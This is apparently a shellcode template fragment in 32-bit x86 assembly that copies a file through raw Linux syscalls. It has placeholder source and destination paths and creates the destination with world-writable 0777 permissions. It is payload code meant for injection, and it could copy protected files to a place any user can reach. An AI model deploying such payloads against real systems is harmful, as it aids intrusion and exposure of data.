	// Open source file
	mov eax, 5            		# SYS_OPEN
	# set EBX to the address of the source path string
	call copy_using_syscalls_source_get_next
copy_using_syscalls_source_get_next:
	pop ebx
	add ebx, 6
	jmp copy_using_syscalls_open_source_file

sourcefile:
	.ascii "[VARIABLE:sourcefile:VARIABLE]\0"

copy_using_syscalls_open_source_file:
	xor ecx, ecx          		# flags (O_RDONLY)
	xor edx, edx          		# mode
	int 0x80
	mov edx, eax          # store file descriptor in r13 rather than a variable to avoid attempts to write to executable memory
	
	// Open destination file
	push edx
	mov eax, 5             		# SYS_OPEN
	# set EBX to the address of the destination path string
	call copy_using_syscalls_dest_get_next
copy_using_syscalls_dest_get_next:
	pop ebx
	add ebx, 6
	jmp copy_using_syscalls_open_dest_file

destfile:
	.ascii "[VARIABLE:destfile:VARIABLE]\0"

copy_using_syscalls_open_dest_file:
	mov ecx, 0x42          		# flags (O_RDWR | O_CREAT)
	mov edx, 0777          		# make destination world-writable
	int 0x80
	mov ecx, eax  # store file descriptor in ecx rather than a variable to avoid attempts to write to executable memory
	pop edx

	push edx
	push ecx
	
	// create a stack variable to use as a copy buffer
	// instead of using a variable defined in this file, because that would result in writing to executable memory
	mov eax, 0
	push eax
	mov edi, esp

copyByteLoop:

	// read a single byte at a time to avoid more complex logic
	push edx
	push ecx
	push edi
	mov eax, 3		# SYS_READ
	mov ebx, edx	# file descriptor
	mov ecx, edi	# buffer address
	mov edx, 1		# number of bytes to read
	int 0x80
	pop edi
	pop ecx
	pop edx
	
	// if no char was read (usually end-of-file), processing is complete
	cmp eax, 0
	jz doneCopying

	// write the byte to the destination file
	push edx
	push ecx
	push edi
	mov eax, 4		# SYS_WRITE      
	mov ebx, ecx	# file descriptor
	mov ecx, edi	# buffer address
	mov edx, 1		# number of bytes to write
	int 0x80
	pop edi
	pop ecx
	pop edx
	
	jmp copyByteLoop

doneCopying:

	// discard the buffer stack variable
	pop eax
	
	pop ecx
	pop edx

	// close file handles
	push edx
	mov ebx, ecx
	mov eax, 6  # sys_close
	int 0x80
	pop edx
	mov ebx, edx
	mov eax, 6  # sys_close
	int 0x80
	
SHELLCODE_SECTION_DELIMITER
	




